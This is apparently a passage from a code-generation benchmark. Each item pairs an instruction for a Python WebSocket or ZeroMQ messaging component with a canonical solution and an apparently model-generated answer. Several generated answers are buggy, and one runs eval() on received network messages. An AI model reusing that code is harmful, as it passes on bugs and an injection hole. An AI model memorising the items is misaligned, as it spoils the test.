    "Instruction": "Task Description: Implement a WebSocket client for bidirectional audio streaming that connects to a server, records audio when a key is pressed, streams it to the server, and plays back received audio. The client should handle connection retries and manage audio streams efficiently.\n\nClass Description: The `Device` class represents a WebSocket client for audio streaming. It handles WebSocket connection management, audio recording and playback, and keyboard input for controlling the recording state.\n\nAttributes:\n- server_url: str - The URL of the WebSocket server to connect to.\n- p: pyaudio.PyAudio - PyAudio instance for handling audio streams.\n- websocket: websockets.WebSocketClientProtocol - The WebSocket connection object.\n- recording: bool - Flag indicating whether audio is currently being recorded.\n- input_stream: pyaudio.Stream - Audio input stream for recording.\n- output_stream: pyaudio.Stream - Audio output stream for playback.\n- spinner: yaspin.Yaspin - Spinner object for visual feedback during recording.\n- play_audio: bool - Flag controlling whether received audio should be played.\n- CHUNK: int - Number of audio frames per buffer.\n- FORMAT: int - Audio sample format (paInt16).\n- CHANNELS: int - Number of audio channels (1 for mono).\n- RECORDING_RATE: int - Sample rate for recording (16000 Hz).\n- PLAYBACK_RATE: int - Sample rate for playback (24000 Hz).\n\nMethods:\n- __init__() -> None - Initializes the Device instance with default values.\n- connect_with_retry(max_retries: int = 50, retry_delay: int = 2) -> None - Attempts to connect to the WebSocket server with retry logic.\n- send_audio() -> None - Handles audio recording and streaming to the server while recording is active.\n- receive_audio() -> None - Receives audio data from the server and plays it back if enabled.\n- on_press(key: keyboard.Key) -> None - Callback for key press events (starts recording when CTRL is pressed).\n- on_release(key: keyboard.Key) -> None - Callback for key release events (stops recording when CTRL is released).\n- main() -> None - Main coroutine that manages the WebSocket connection and audio tasks.\n- start() -> None - Starts the asyncio event loop to run the main coroutine.",
    "Canonical_solution": "import asyncio\nimport websockets\nimport pyaudio\nfrom pynput import keyboard\nimport json\nfrom yaspin import yaspin\n\nclass Device:\n    def __init__(self):\n        self.server_url = \"0.0.0.0:10001\"\n        self.p = pyaudio.PyAudio()\n        self.websocket = None\n        self.recording = False\n        self.input_stream = None\n        self.output_stream = None\n        self.spinner = yaspin()\n        self.play_audio = True\n        self.CHUNK = 1024\n        self.FORMAT = pyaudio.paInt16\n        self.CHANNELS = 1\n        self.RECORDING_RATE = 16000\n        self.PLAYBACK_RATE = 24000\n\n    async def connect_with_retry(self, max_retries=50, retry_delay=2):\n        for attempt in range(max_retries):\n            try:\n                self.websocket = await websockets.connect(f\"ws://{self.server_url}\")\n                return\n            except ConnectionRefusedError:\n                if attempt % 8 == 0 and attempt != 0:\n                    print(f\"Loading...\")\n                await asyncio.sleep(retry_delay)\n        raise Exception(\"Failed to connect to the server after multiple attempts\")\n\n    async def send_audio(self):\n        self.input_stream = self.p.open(format=self.FORMAT, channels=self.CHANNELS, rate=self.RECORDING_RATE, input=True, frames_per_buffer=self.CHUNK)\n        while True:\n            if self.recording:\n                try:\n                    await self.websocket.send(json.dumps({\"role\": \"user\", \"type\": \"audio\", \"format\": \"bytes.wav\", \"start\": True}))\n                    while self.recording:\n                        data = self.input_stream.read(self.CHUNK, exception_on_overflow=False)\n                        await self.websocket.send(data)\n                    await self.websocket.send(json.dumps({\"role\": \"user\", \"type\": \"audio\", \"format\": \"bytes.wav\", \"end\": True}))\n                except Exception as e:\n                    print(f\"Error in send_audio: {e}\")\n            await asyncio.sleep(0.01)\n\n    async def receive_audio(self):\n        self.output_stream = self.p.open(format=self.FORMAT, channels=self.CHANNELS, rate=self.PLAYBACK_RATE, output=True, frames_per_buffer=self.CHUNK)\n        while True:\n            try:\n                data = await self.websocket.recv()\n                if self.play_audio and isinstance(data, bytes) and not self.recording:\n                    self.output_stream.write(data)\n            except Exception as e:\n                await self.connect_with_retry()\n\n    def on_press(self, key):\n        if key == keyboard.Key.ctrl and not self.recording:\n            print(\"\")\n            self.spinner.start()\n            self.recording = True\n\n    def on_release(self, key):\n        if key == keyboard.Key.ctrl:\n            self.spinner.stop()\n            self.recording = False\n\n    async def main(self):\n        await self.connect_with_retry()\n        print(\"\\nHold CTRL to speak to your assistant. Press 'CTRL-C' to quit.\")\n        listener = keyboard.Listener(on_press=self.on_press, on_release=self.on_release)\n        listener.start()\n        await asyncio.gather(self.send_audio(), self.receive_audio())\n\n    def start(self):\n        asyncio.run(self.main())",
    "Code_level": "Class-level",
    "FSMID_for_test": 45,
    "right_result": "import asyncio\nimport websockets\nimport pyaudio\nimport keyboard\nfrom yaspin import Yaspin, spinners\n\nclass Device:\n    def __init__(self):\n        self.server_url = \"ws://example.com/audio\"\n        self.p = pyaudio.PyAudio()\n        self.websocket = None\n        self.recording = False\n        self.input_stream = None\n        self.output_stream = None\n        self.spinner = None\n        self.play_audio = True\n        self.CHUNK = 1024\n        self.FORMAT = pyaudio.paInt16\n        self.CHANNELS = 1\n        self.RECORDING_RATE = 16000\n        self.PLAYBACK_RATE = 24000\n\n    async def connect_with_retry(self, max_retries=50, retry_delay=2):\n        for i in range(max_retries):\n            try:\n                self.websocket = await websockets.connect(self.server_url)\n                print(\"Connected to WebSocket server\")\n                return\n            except Exception as e:\n                print(f\"Connection failed: {e}. Retrying in {retry_delay} seconds...\")\n                await asyncio.sleep(retry_delay)\n        print(\"Failed to connect after maximum retries\")\n\n    async def send_audio(self):\n        if not self.recording or not self.input_stream or not self.websocket:\n            return\n        data = self.input_stream.read(self.CHUNK)\n        await self.websocket.send(data)\n\n    async def receive_audio(self):\n        if not self.websocket or not self.output_stream:\n            return\n        while True:\n            try:\n                data = await self.websocket.recv()\n                self.output_stream.write(data)\n            except Exception as e:\n                print(f\"Error receiving audio: {e}\")\n                break\n\n    def on_press(self, key):\n        if key == keyboard.Key.ctrl:\n            self.recording = not self.recording\n            if self.recording:\n                self.spinner = Yaspin(spinner=spinners.bouncing_ball, text=\"Recording...\")\n                self.input_stream = self.p.open(format=self.FORMAT,\n                                               channels=self.CHANNELS,\n                                               rate=self.RECORDING_RATE,\n                                               input=True,\n                                               frames_per_buffer=self.CHUNK)\n                self.output_stream = self.p.open(format=self.FORMAT,\n                                                 channels=self.CHANNELS,\n                                                 rate=self.PLAYBACK_RATE,\n                                                 output=True,\n                                                 frames_per_buffer=self.CHUNK)\n            else:\n                self.spinner.stop()\n                self.input_stream.close()\n                self.output_stream.close()\n\n    def on_release(self, key):\n        if key == keyboard.Key.ctrl:\n            self.recording = False\n\n    async def main(self):\n        await self.connect_with_retry()\n        keyboard.on_press(self.on_press)\n        keyboard.on_release(self.on_release)\n        await asyncio.gather(self.send_audio(), self.receive_audio())\n\n    def start(self):\n        asyncio.run(self.main())"
  },
  {
    "Task_id": 470,
    "Instruction": "Task Description: Implement a WebSocket server using Python's asyncio and websockets libraries to handle client connections, process incoming JSON messages, and send responses back to clients.\n\nFunction Description: The server function handles WebSocket connections, processes incoming JSON messages, performs different operations based on the 'function' field in the JSON data, and sends back appropriate responses.\n\nInput:\n- websocket: WebSocket connection object (provided by websockets library)\n- path: str - The path requested by the client (provided by websockets library)\n\nOutput: None (The function runs indefinitely to handle WebSocket connections and messages)\n\nTask Description: Create a WebSocket server that starts listening on a specified host and port, and maintains persistent connections with clients to exchange JSON-formatted messages.\n\nFunction Description: The start_websocket_server function initializes and starts a WebSocket server that listens on localhost:5150, using the server function to handle incoming connections and messages.\n\nInput: None\n\nOutput: None (The function runs indefinitely to keep the server active)",
    "Canonical_solution": "import asyncio\nimport websockets\nimport json\n\nasync def server(websocket, path):\n  while True:\n    # Get received data from websocket\n    data = await websocket.recv()\n    print (\"Received: \" + data)\n    json_data = json.loads(data)\n    if json_data.get('function') == 'echo':\n      #echo back the first argument\n      json_data['return'] = json_data['args'][0]\n    elif json_data.get('function') == 'ask':\n      #echo back the first argument\n      json_data['return'] = input(json_data['args'][0])\n    elif json_data.get('function') == 'throw':\n      #throw the first argument\n      json_data['throw'] = json_data['args'][0]\n    elif not json_data.get('function') is None:\n      json_data['throw'] = 'Unknown function : ' + json_data['function']\n\n    # Send response back to client to acknowledge receiving message\n    response = json.dumps(json_data)\n    print (\"Responding: \" + response)\n    await websocket.send(response)\n\ndef start_websocket_server():\n    # Create websocket server\n    start_server = websockets.serve(server, \"localhost\", 5150)\n    # Start and run websocket server forever\n    asyncio.get_event_loop().run_until_complete(start_server)\n    print(\"Starting loop\")\n    asyncio.get_event_loop().run_forever()",
    "Code_level": "Function-level",
    "FSMID_for_test": 45,
    "right_result": "import asyncio\nimport websockets\nimport json\n\nasync def server(websocket, path):\n    try:\n        while True:\n            message = await websocket.recv()\n            data = json.loads(message)\n            function = data.get('function')\n            \n            if function == 'echo':\n                response = {'response': 'Echo received'}\n                await websocket.send(json.dumps(response))\n            elif function == 'ping':\n                response = {'response': 'Pong'}\n                await websocket.send(json.dumps(response))\n            else:\n                response = {'error': 'Unknown function'}\n                await websocket.send(json.dumps(response))\n    except websockets.exceptions.ConnectionClosed:\n        pass\n\nasync def start_websocket_server():\n    async with websockets.serve(server, \"localhost\", 5150):\n        await asyncio.Future()  # Run forever\n\nasyncio.run(start_websocket_server())"
  },
  {
    "Task_id": 471,
    "Instruction": "Task Description: Implement a ZeroMQ-based RPC client class in Python that subscribes to messages from a publisher, handles heartbeats, and manages connection states.\n\nClass Description: The RpcClient class establishes a ZeroMQ SUB socket to receive messages from a publisher, monitors connection health through heartbeats, and provides callback functionality for message processing.\n\nAttributes:\n- _context: zmq.Context - ZeroMQ context for socket management\n- _socket_sub: zmq.Socket - SUB socket for receiving messages\n- _active: bool - Flag indicating if the client is running\n- _thread: threading.Thread - Thread for running the message loop\n- _lock: threading.Lock - Thread synchronization lock\n- _last_received_ping: float - Timestamp of last received heartbeat\n\nMethods:\n- __init__() -> None - Initializes the ZeroMQ context and SUB socket with keepalive options\n- start(sub_address: str) -> None - Connects to the publisher and starts the message loop thread\n- stop() -> None - Stops the message loop thread\n- join() -> None - Waits for the message loop thread to complete\n- run() -> None - Main message processing loop (handles heartbeats and disconnections)\n- callback(topic: str, data: Any) -> None - Abstract method for processing received messages (to be implemented by subclasses)\n- subscribe_topic(topic: str) -> None - Subscribes to a specific message topic\n- on_disconnected() -> None - Handles disconnection events (prints warning message)",
    "Canonical_solution": "import threading\nfrom time import time\nfrom functools import lru_cache\nfrom typing import Any\nimport zmq\n\nclass RpcClient:\n    def __init__(self) -> None:\n        self._context: zmq.Context = zmq.Context()\n        self._socket_sub: zmq.Socket = self._context.socket(zmq.SUB)\n        \n        self._socket_sub.setsockopt(zmq.TCP_KEEPALIVE, 1)\n        self._socket_sub.setsockopt(zmq.TCP_KEEPALIVE_IDLE, 60)\n\n        self._active: bool = False\n        self._thread: threading.Thread = None\n        self._lock: threading.Lock = threading.Lock()\n        self._last_received_ping: time = time()\n\n    def start(self, sub_address: str) -> None:\n        if self._active:\n            return\n\n        self._socket_sub.connect(sub_address)\n        self._active = True\n        self._thread = threading.Thread(target=self.run)\n        self._thread.start()\n        self._last_received_ping = time()\n\n    def stop(self) -> None:\n        if not self._active:\n            return\n        self._active = False\n\n    def join(self) -> None:\n        if self._thread and self._thread.is_alive():\n            self._thread.join()\n        self._thread = None\n\n    def run(self) -> None:\n        pull_tolerance: int = HEARTBEAT_TOLERANCE * 1000\n\n        while self._active:\n            if not self._socket_sub.poll(pull_tolerance):\n                self.on_disconnected()\n                continue\n\n            topic, data = self._socket_sub.recv_pyobj(flags=zmq.NOBLOCK)\n\n            if topic == HEARTBEAT_TOPIC:\n                self._last_received_ping = data\n            else:\n                self.callback(topic, data)\n\n        self._socket_sub.close()\n\n    def callback(self, topic: str, data: Any) -> None:\n        raise NotImplementedError\n\n    def subscribe_topic(self, topic: str) -> None:\n        self._socket_sub.setsockopt_string(zmq.SUBSCRIBE, topic)\n\n    def on_disconnected(self):\n        msg: str = f\"RpcServer has no response over {HEARTBEAT_TOLERANCE} seconds, please check you connection.\"\n        print(msg)",
    "Code_level": "Class-level",
    "FSMID_for_test": 85,
    "right_result": "import zmq\nimport threading\nimport time\nfrom typing import Any, Optional\n\nclass RpcClient:\n    def __init__(self):\n        self._context = zmq.Context()\n        self._socket_sub = self._context.socket(zmq.SUB)\n        self._active = False\n        self._thread = None\n        self._lock = threading.Lock()\n        self._last_received_ping = 0.0\n\n    def start(self, sub_address: str) -> None:\n        self._socket_sub.connect(sub_address)\n        self._socket_sub.setsockopt(zmq.SUBSCRIBE, b'')\n        self._active = True\n        self._thread = threading.Thread(target=self.run)\n        self._thread.start()\n\n    def stop(self) -> None:\n        self._active = False\n        self._thread.join()\n\n    def join(self) -> None:\n        if self._thread and self._thread.is_alive():\n            self._thread.join()\n\n    def run(self) -> None:\n        while self._active:\n            try:\n                message = self._socket_sub.recv_multipart()\n                topic = message[0].decode('utf-8')\n                data = message[1] if len(message) > 1 else None\n                self.callback(topic, data)\n            except Exception as e:\n                print(f\"Error receiving message: {e}\")\n                self.on_disconnected()\n            time.sleep(0.1)\n\n    def callback(self, topic: str, data: Any) -> None:\n        pass\n\n    def subscribe_topic(self, topic: str) -> None:\n        self._socket_sub.setsockopt(zmq.SUBSCRIBE, topic.encode('utf-8'))\n\n    def on_disconnected(self) -> None:\n        print(\"Warning: Client disconnected from publisher.\")"
  },
  {
    "Task_id": 472,
    "Instruction": "Task Description: Implement a ZeroMQ consumer class in Python that subscribes to messages from a publisher using the PUB/SUB pattern, with timeout handling for message reception.\n\nClass Description: The ZeroMQConsumer class establishes a connection to a ZeroMQ publisher, subscribes to all messages, and provides methods to receive messages and clean up resources.\n\nAttributes:\n- _zmq_context: zmq.Context - The ZeroMQ context for managing sockets\n- socket: zmq.Socket - The SUB socket for receiving messages from the publisher\n\nMethods:\n- __init__(zmq_port: int) -> None - Initializes the consumer with a connection to the specified port\n  - Input: zmq_port (int) - The port number to connect to the publisher\n  - Output: None\n- receive_message() -> Dict[str, Any] - Receives and parses a message from the publisher\n  - Input: None\n  - Output: Dict[str, Any] - The parsed message content or empty dict if timeout occurs\n- close() -> None - Closes the socket and terminates the context\n  - Input: None\n  - Output: None",
    "Canonical_solution": "import zmq\nfrom typing import Dict, Any\nimport ujson\n\nclass ZeroMQConsumer:\n    def __init__(self, zmq_port: int):\n        self._zmq_context = zmq.Context()\n        self.socket = self._zmq_context.socket(zmq.SUB)\n        self.socket.connect(f\"tcp://localhost:{zmq_port}\")\n        self.socket.setsockopt_string(zmq.SUBSCRIBE, \"\")\n        self.socket.setsockopt(zmq.RCVTIMEO, 100)  # ZMQ_RECV_TIMEOUT\n\n    def receive_message(self) -> Dict[str, Any]:\n        try:\n            json_data = self.socket.recv_string()\n            return ujson.loads(json_data)\n        except zmq.Again:\n            return {}\n\n    def close(self):\n        self.socket.close()\n        self._zmq_context.term()",
    "Code_level": "Class-level",
    "FSMID_for_test": 85,
    "right_result": "import zmq\n\nclass ZeroMQConsumer:\n    def __init__(self, zmq_port: int) -> None:\n        self._zmq_context = zmq.Context()\n        self.socket = self._zmq_context.socket(zmq.SUB)\n        self.socket.connect(f\"tcp://localhost:{zmq_port}\")\n        self.socket.setsockopt(zmq.SUBSCRIBE, b'')\n    \n    def receive_message(self) -> dict:\n        try:\n            message = self.socket.recv().decode()\n            return eval(message)\n        except zmq.Again:\n            return {}\n    \n    def close(self) -> None:\n        self.socket.close()\n        self._zmq_context.term()"
  },
  {
    "Task_id": 473,
    "Instruction": "Task Description: Implement a ZeroMQ-based message manager class for handling publish-subscribe communication between processes, supporting both message publishing and subscription functionalities.\n\nClass Description: The ZmqManager class provides an interface for ZeroMQ-based inter-process communication using PUB/SUB and PUSH/PULL patterns. It handles message serialization/deserialization and manages connections to publisher/subscriber endpoints.\n\nAttributes:\n- sink: [zmq.Socket] - ZeroMQ PUSH socket for sending messages to the publisher\n- sub: [zmq.Socket] - ZeroMQ SUB socket for receiving messages from the publisher\n- channel: [str] - The communication channel identifier for message filtering\n\nMethods:\n- __init__(url: str = 'zmq+tcp://localhost:5555+5556', channel: str = 'socketio', write_only: bool = False) -> None - Initializes the ZeroMQ connections. Parses the connection URL and sets up both PUSH and SUB sockets.\n- _publish(data: Any) -> None - Serializes and publishes data to the specified channel using pickle.\n- zmq_listen() -> Generator[bytes, None, None] - Continuously listens for incoming messages from the SUB socket and yields raw byte messages.\n- _listen() -> Generator[Any, None, None] - Listens for messages, deserializes them using pickle, and yields only messages matching the specified channel.",
    "Canonical_solution": "import pickle\nimport re\nfrom eventlet.green import zmq\n\nclass ZmqManager:\n    def __init__(self, url='zmq+tcp://localhost:5555+5556', channel='socketio', write_only=False):\n        r = re.compile(r':\\d+\\+\\d+$')\n        if not (url.startswith('zmq+tcp://') and r.search(url)):\n            raise RuntimeError('unexpected connection string: ' + url)\n\n        url = url.replace('zmq+', '')\n        (sink_url, sub_port) = url.split('+')\n        sink_port = sink_url.split(':')[-1]\n        sub_url = sink_url.replace(sink_port, sub_port)\n\n        sink = zmq.Context().socket(zmq.PUSH)\n        sink.connect(sink_url)\n\n        sub = zmq.Context().socket(zmq.SUB)\n        sub.setsockopt_string(zmq.SUBSCRIBE, '')\n        sub.connect(sub_url)\n\n        self.sink = sink\n        self.sub = sub\n        self.channel = channel\n\n    def _publish(self, data):\n        pickled_data = pickle.dumps(\n            {\n                'type': 'message',\n                'channel': self.channel,\n                'data': data\n            }\n        )\n        return self.sink.send(pickled_data)\n\n    def zmq_listen(self):\n        while True:\n            response = self.sub.recv()\n            if response is not None:\n                yield response\n\n    def _listen(self):\n        for message in self.zmq_listen():\n            if isinstance(message, bytes):\n                try:\n                    message = pickle.loads(message)\n                except Exception:\n                    pass\n            if isinstance(message, dict) and \\\n                    message['type'] == 'message' and \\\n                    message['channel'] == self.channel and \\\n                    'data' in message:\n                yield message['data']\n        return",
    "Code_level": "Class-level",
    "FSMID_for_test": 85,
    "right_result": "import zmq\n\nclass ZmqManager:\n    def __init__(self, url: str = 'zmq+tcp://localhost:5555+5556', channel: str = 'socketio', write_only: bool = False) -> None:\n        self.context = zmq.Context()\n        self.sink = self.context.socket(zmq.PUSH)\n        self.sub = self.context.socket(zmq.SUB)\n        self.channel = channel\n        self.write_only = write_only\n        \n        # Parse URL\n        parts = url.split('+')\n        self.publisher_url = parts[0]\n        self.subscriber_url = parts[1] if len(parts) > 1 else self.publisher_url\n        \n        # Connect to publisher\n        self.sink.connect(self.publisher_url)\n        \n        # Connect to subscriber\n        self.sub.connect(self.subscriber_url)\n        self.sub.setsockopt_string(zmq.SUBSCRIBE, self.channel.encode())\n\n    def _publish(self, data: any) -> None:\n        serialized = self._serialize(data)\n        self.sink.send(serialized)\n\n    def _deserialize(self, data: bytes) -> any:\n        return self.context.socket(zmq.PULL).recv_pyobj()\n\n    def _serialize(self, data: any) -> bytes:\n        import pickle\n        return pickle.dumps(data)\n\n    def zmq_listen(self) -> Generator[bytes, None, None]:\n        while True:\n            message = self.sub.recv()\n            yield message\n\n    def _listen(self) -> Generator[any, None, None]:\n        while True:\n            message = self._deserialize(self.sub.recv())\n            if self.channel in message.get('channel', ''):\n                yield message"
  },
  {
    "Task_id": 474,
    "Instruction": "Task Description: Implement a ZeroMQ-based client class for bidirectional communication with a server, capable of sending text data and receiving processed results as NumPy arrays.\n\nClass Description: BertClient is a ZeroMQ client that establishes PUSH-SUB pattern communication with a server. It sends text data for processing and subscribes to receive the processed results as NumPy arrays.\n\nAttributes:\n- context: zmq.Context - ZeroMQ context for socket management\n- sender: zmq.Socket - PUSH socket for sending requests to server\n- receiver: zmq.Socket - SUB socket for receiving responses from server\n- identity: bytes - Unique client identifier\n- request_id: int - Counter for tracking pending requests\n- timeout: int - Timeout setting for operations\n- pending_request: set - Set of outstanding request IDs\n\nMethods:\n- __init__(ip='localhost', port=5555, port_out=5556, identity=None, timeout=-1) -> None - Initializes the client with server connection details\n- close() -> None - Closes sockets and terminates context\n- _send(msg, msg_len=0) -> None - Internal method for sending messages to server\n- _recv() -> Response - Internal method for receiving raw responses\n- _recv_ndarray() -> Response - Internal method for receiving and decoding NumPy array responses\n- encode(texts, blocking=True) -> Optional[np.ndarray] - Sends texts for encoding and returns processed arrays\n- fetch(delay=0.0) -> Generator[Response, None, None] - Yields pending responses with optional delay\n- fetch_all(sort=True, concat=False) -> Union[List[np.ndarray], np.ndarray] - Retrieves all pending responses with sorting and concatenation options",
    "Canonical_solution": "import sys\nimport uuid\nimport zmq\nfrom zmq.utils import jsonapi\nimport numpy as np\nimport pickle\nfrom collections import namedtuple\n\nResponse = namedtuple('Response', ['id', 'content'])\n\nclass BertClient:\n    def __init__(self, ip='localhost', port=5555, port_out=5556, identity=None, timeout=-1):\n        self.context = zmq.Context()\n        self.sender = self.context.socket(zmq.PUSH)\n        self.sender.setsockopt(zmq.LINGER, 0)\n        self.identity = identity or str(uuid.uuid4()).encode('ascii')\n        self.sender.connect('tcp://%s:%d' % (ip, port))\n\n        self.receiver = self.context.socket(zmq.SUB)\n        self.receiver.setsockopt(zmq.LINGER, 0)\n        self.receiver.setsockopt(zmq.SUBSCRIBE, self.identity)\n        self.receiver.connect('tcp://%s:%d' % (ip, port_out))\n\n        self.request_id = 0\n        self.timeout = timeout\n        self.pending_request = set()\n\n    def close(self):\n        self.sender.close()\n        self.receiver.close()\n        self.context.term()\n\n    def _send(self, msg, msg_len=0):\n        self.sender.send_multipart([self.identity, msg, b'%d' % self.request_id, b'%d' % msg_len])\n        self.pending_request.add(self.request_id)\n        self.request_id += 1\n\n    def _recv(self):\n        response = self.receiver.recv_multipart()\n        request_id = int(response[-1])\n        self.pending_request.remove(request_id)\n        return Response(request_id, response)\n\n    def _recv_ndarray(self):\n        request_id, response = self._recv()\n        arr_info, arr_val = jsonapi.loads(response[1]), response[2]\n        X = np.frombuffer(memoryview(arr_val), dtype=str(arr_info['dtype']))\n        return Response(request_id, X.reshape(arr_info['shape']))\n\n    def encode(self, texts, blocking=True):\n        self._send(jsonapi.dumps(texts), len(texts))\n        rst = self._recv_ndarray().content if blocking else None\n        return rst\n\n    def fetch(self, delay=.0):\n        time.sleep(delay)\n        while self.pending_request:\n            yield self._recv_ndarray()\n\n    def fetch_all(self, sort=True, concat=False):\n        if self.pending_request:\n            tmp = list(self.fetch())\n            if sort:\n                tmp = sorted(tmp, key=lambda v: v.id)\n            tmp = [v.content for v in tmp]\n            if concat:\n                tmp = np.concatenate(tmp, axis=0)\n            return tmp",
    "Code_level": "Class-level",
    "FSMID_for_test": 85,
    "right_result": "import numpy as np\nimport zmq\n\nclass BertClient:\n    def __init__(self, ip='localhost', port=5555, port_out=5556, identity=None, timeout=-1):\n        self.context = zmq.Context()\n        self.sender = self.context.socket(zmq.PUSH)\n        self.receiver = self.context.socket(zmq.SUB)\n        self.identity = identity or b'bert_client'\n        self.request_id = 0\n        self.timeout = timeout\n        self.pending_request = set()\n        self.sender.connect(f'tcp://{ip}:{port_out}')\n        self.receiver.connect(f'tcp://{ip}:{port}')\n        self.receiver.setsockopt(zmq.SUBSCRIBE, b'')\n    \n    def close(self):\n        self.sender.close()\n        self.receiver.close()\n        self.context.term()\n    \n    def _send(self, msg, msg_len=0):\n        self.sender.send(msg)\n    \n    def _recv(self):\n        return self.receiver.recv()\n    \n    def _recv_ndarray(self):\n        msg = self._recv()\n        if msg.startswith(b'NDARRAY_'):\n            data = msg[len(b'NDARRAY_'):]\n            return np.frombuffer(data, dtype=np.float32)\n        return None\n    \n    def encode(self, texts, blocking=True):\n        if not isinstance(texts, list):\n            texts = [texts]\n        for text in texts:\n            self.request_id += 1\n            self.pending_request.add(self.request_id)\n            self._send(f'TEXT_{self.request_id}'.encode('utf-8'), len(f'TEXT_{self.request_id}'))\n        if blocking:\n            results = []\n            for _ in range(len(texts)):\n                while self.pending_request and self.request_id in self.pending_request:\n                    resp = self._recv_ndarray()\n                    if resp is not None:\n                        results.append(resp)\n                        self.pending_request.remove(self.request_id)\n                        self.request_id += 1\n            return results\n        return None\n    \n    def fetch(self, delay=0.0):\n        while self.pending_request:\n            yield self._recv_ndarray()\n            if delay > 0:\n                import time\n                time.sleep(delay)\n    \n    def fetch_all(self, sort=True, concat=False):\n        results = list(self.fetch())\n        if sort:\n            results.sort(key=lambda x: x[0])\n        if concat:\n            return np.concatenate(results)\n        return results"
  },
  {
    "Task_id": 475,
    "Instruction": "Task Description: Implement a ZeroMQ subscriber in Python that connects to a publisher and continuously receives messages.\n\nFunction Description: The function `setup_zmq_subscriber` initializes a ZeroMQ subscriber socket, connects it to a specified publisher endpoint, and configures it to subscribe to all messages. The function `receive_messages` continuously listens for and prints messages received through the socket.\n\nInput: \n- `remote_ip` (str, optional): The endpoint address of the ZeroMQ publisher in the format 'tcp://IP_ADDRESS:PORT'. Defaults to 'tcp://REMOTE_IP_ADDRESS:5555'.\n\nOutput: \n- `socket` (zmq.Socket): A configured ZeroMQ SUB socket ready to receive messages.\n- None (for `receive_messages`): The function runs indefinitely, printing received messages.",
    "Canonical_solution": "import zmq\n\ndef setup_zmq_subscriber(remote_ip='tcp://REMOTE_IP_ADDRESS:5555'):\n    context = zmq.Context()\n    socket = context.socket(zmq.SUB)\n    socket.connect(remote_ip)\n    socket.setsockopt_string(zmq.SUBSCRIBE, '')\n    return socket\n\ndef receive_messages(socket):\n    while True:\n        msg = socket.recv_string()\n        print(msg)",
    "Code_level": "Function-level",
    "FSMID_for_test": 85,
    "right_result": "import zmq\n\ndef setup_zmq_subscriber(remote_ip='tcp://REMOTE_IP_ADDRESS:5555'):\n    context = zmq.Context()\n    socket = context.socket(zmq.SUB)\n    socket.connect(remote_ip)\n    socket.setsockopt(zmq.SUBSCRIBE, b'')  # Subscribe to all messages\n    return socket\n\ndef receive_messages(socket):\n    while True:\n        message = socket.recv().decode('utf-8')\n        print(message)"
  },
  {
    "Task_id": 476,
    "Instruction": "Task Description: Create a Python class that connects to a remote progress bar using ZeroMQ's PUB/SUB pattern to receive and display progress updates from a separate process.\n\nClass Description: The RemoteProgress class establishes a ZeroMQ SUB socket to subscribe to progress updates broadcast by a publisher process. It continuously receives messages containing progress percentages and labels, displaying them in a formatted way until interrupted.\n\nAttributes:\n- hostname: str - The hostname or IP address of the publisher (default: 'localhost')\n- port: int - The port number to connect to (default: 8080)\n- label: str - The current progress label received from the publisher\n\nMethods:\n- __init__(port: int = 8080, hostname: str = 'localhost') -> None - Initializes the RemoteProgress instance with connection parameters\n- __call__() -> None - Main method that establishes the connection, receives messages, and displays progress (runs in an infinite loop until interrupted)\n- _display_progress(percentage: float) -> None - Helper method that formats and displays the progress percentage (private method)",
    "Canonical_solution": "import zmq\nfrom typing import Optional\n\nclass RemoteProgress:\n    \"\"\"\n    Connect to a progress bar in a separate process with output_mode\n    set to 'broadcast' in order to display the results (to stdout).\n    \"\"\"\n\n    def __init__(self, port: int = 8080, hostname: str = 'localhost'):\n        self.hostname = hostname\n        self.port = port\n        self.label = \"\"\n\n    def __call__(self):\n        context = zmq.Context()\n        sock = context.socket(zmq.SUB)\n        sock.setsockopt(zmq.SUBSCRIBE, b'')\n        sock.connect('tcp://' + self.hostname +':'+str(self.port))\n        \n        percent = None\n        while True:\n            try:\n                message = sock.recv()\n                [percent_str, label] = message.split(b'|')\n                percent = float(percent_str)\n                self.label = label.decode()\n                self._display_progress(percent)\n            except KeyboardInterrupt:\n                if percent is not None:\n                    print(f\"Exited at {percent:.3f}% completion\")\n                break\n            except Exception:\n                print(f\"Could not process socket message: {message!r}\")\n\n    def _display_progress(self, percentage: float):\n        print(f\"\\r{self.label}: {percentage:.1f}%\", end='')",
    "Code_level": "Class-level",
    "FSMID_for_test": 85,
    "right_result": "import zmq\n\nclass RemoteProgress:\n    def __init__(self, port: int = 8080, hostname: str = 'localhost') -> None:\n        self.hostname = hostname\n        self.port = port\n        self.label = ''\n\n    def __call__(self) -> None:\n        context = zmq.Context()\n        socket = context.socket(zmq.SUB)\n        socket.connect(f'tcp://{self.hostname}:{self.port}')\n        socket.setsockopt(zmq.SUBSCRIBE, b'')\n        \n        while True:\n            try:\n                message = socket.recv().decode()\n                if message:\n                    self.label, percentage = message.split(': ')\n                    percentage = float(percentage)\n                    self._display_progress(percentage)\n            except KeyboardInterrupt:\n                break\n\n    def _display_progress(self, percentage: float) -> None:\n        print(f\"Progress: {self.label} - {percentage:.2f}%\")"
  },
  {
    "Task_id": 479,
    "Instruction": "Task Description: Implement a ZeroMQ-based server that handles task distribution and status updates from multiple workers using the REQ/REP pattern. The server should manage a queue of tasks, distribute them to workers, and handle task success/failure notifications.\n\nFunction Description: The `server` function sets up a ZeroMQ REP socket to listen for worker requests. It manages a task queue (`remaining_entries`) and worker count (`running_workers`), distributing tasks to workers and processing their success/failure responses. The server runs indefinitely until all tasks are completed or workers disconnect.\n\nInput:\n- `--channel-ip` (str, optional): IP address for ZeroMQ communication (default: None, binds to all interfaces)\n- `--channel-port` (int, optional): Port number for ZeroMQ communication (default: 5555)\n\nOutput: None (runs indefinitely as a server process)\n\nNote: The function maintains internal state for:\n1. `remaining_entries`: List of pending task IDs\n2. `running_workers`: Count of active workers\nThese should be initialized before the main loop (not shown in reference code)",
